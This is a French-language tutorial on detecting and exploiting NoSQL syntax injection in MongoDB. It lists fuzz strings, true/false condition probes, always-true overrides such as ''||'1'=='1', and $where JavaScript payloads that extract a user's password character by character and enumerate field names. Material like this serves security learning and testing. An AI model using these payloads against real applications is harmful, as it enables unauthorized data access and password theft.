# Détection de l'injection de syntaxe dans MongoDB

Détecter les vulnérabilités d'injection NoSQL en tentant de casser la syntaxe de la requête.
 
- Testez systématiquement chaque entrée en soumettant des chaînes fuzz et des caractères spéciaux qui déclenchent une erreur de base de données ou tout autre comportement détectable.

- Si vous connaissez le langage API de la base de données cible, utilisez des caractères spéciaux et des chaînes fuzz pertinentes pour ce langage. `Sinon, utilisez diverses chaînes fuzz pour cibler plusieurs langages API. `

```sh
'"`{
;$Foo}
$Foo \xYZ
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
'+'
```

> Si cela entraîne une modification par rapport à la réponse d'origine, cela peut indiquer que les entrées de l'utilisateur ne sont pas filtrées ou nettoyées correctement. 

### 1. Déterminer quels caractères sont traités

Pour déterminer quels caractères sont interprétés comme syntaxe par l'application, vous pouvez :

- Injecter des caractères individuels (`'`)

> Si cela entraîne un changement par rapport à la réponse originale, cela peut indiquer que le caractère `'` a rompu la syntaxe de la requête et provoqué une erreur de syntaxe.

- Pour confirmer en soumeter une chaîne de requête valide dans l'entrée (`\'`)

> Si cela ne provoque pas d'erreur de syntaxe, cela peut signifier que l'application est vulnérable à une attaque par injection. 

### 2. Confirmation du comportement conditionnel

Après avoir détecté une vulnérabilité, l'étape suivante consiste à déterminer si vous pouvez influencer les conditions booléennes à l'aide de la syntaxe NoSQL. 

Pour tester cela, envoyez deux requêtes :

- Une avec une condition fausse:

```
' && 0 && 'x
' && '1'=='2
```

- Une avec une condition vraie:

```
' && 1 && 'x
' && '1'=='1
```

> Si l’application se comporte différemment, cela suggère que la condition fausse a un impact sur la logique de la requête, mais pas la condition vraie. Cela indique que l'injection de ce style de syntaxe a un impact sur une requête côté serveur. 

### 3. Annulation des conditions existantes

Maintenant que vous avez identifié que vous pouvez influencer les conditions booléennes, vous pouvez tenter de remplacer les conditions existantes pour exploiter la vulnérabilité. 

Injecter une condition JavaScript qui est toujours évaluée à vrai, telle que 

```sh
'||'1'=='1
'||1||'
```

> Comme la condition injectée est toujours vraie, la requête modifiée renvoie tous les éléments.

> Vous pouvez également ajouter un caractère null `'%00` Cela signifie que toutes les conditions supplémentaires sur la requête MongoDB sont ignorées.n caractère null.


# Exploiter l'injection de syntaxe pour extraire des données

Dans de nombreuses bases de données NoSQL, des fonctions telles que l'opérateur `$where` et la méthode `mapReduce()` permettent l'exécution de code JavaScript. 

Si une application vulnérable utilise ces fonctionnalités, il est possible d'exploiter le JavaScript intégré pour accéder ou extraire des données de la base de données.

### Exfiltration de données dans MongoDB 

Considérez une application vulnérable qui permet aux utilisateurs de rechercher d'autres noms d'utilisateur enregistrés et d'afficher leur rôle. Cela déclenche une requête vers l'URL

```sh
https://insecure-website.com/user/lookup?username=admin
```

Cela donne la requête NoSQL suivante du users collection:

```json
{"$where":"this.username == 'admin'"}
```

Comme la requête utilise l'opérateur `$where`, vous pouvez tenter d'injecter des fonctions JavaScript dans cette requête afin qu'elle renvoie des données sensibles. Par exemple, vous pouvez envoyer la charge utile suivante :

```sh
admin' && this.password[0] == 'a' || 'a'=='b
```

Ceci renvoie le premier caractère de la chaîne du mot de passe de l'utilisateur, vous permettant d'extraire le mot de passe caractère par caractère.

Vous pouvez également utiliser le JavaScript `match()` fonction pour extraire des informations. Par exemple, la charge utile suivante vous permet d'identifier si le mot de passe contient des chiffres :

```sh
admin' && this.password.match(/\d/) || 'a'=='b
```

**Identifier les noms de champs**

Vous devrez peut-être identifier des champs valides dans la collection avant de pouvoir extraire des données à l'aide de l'injection JavaScript.

Par exemple, pour identifier si la base de données MongoDB contient un champ `password`, vous pouvez soumettre la charge utile suivante :

```sh
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'

' && this.password!='
```

Envoyez à nouveau la charge utile pour un champ existant et pour un champ qui n'existe pas.

Dans cet exemple, vous savez que le champ `username` existe, vous pouvez donc envoyer les charges utiles suivantes :

```sh
admin' && this.username!='

admin' && this.foo!='
```

> Si le `password` existe, vous vous attendez à ce que la réponse soit **`identique`** à la réponse du champ existant (`username`), mais différente de la réponse pour le champ qui n'existe pas (`foo`). 


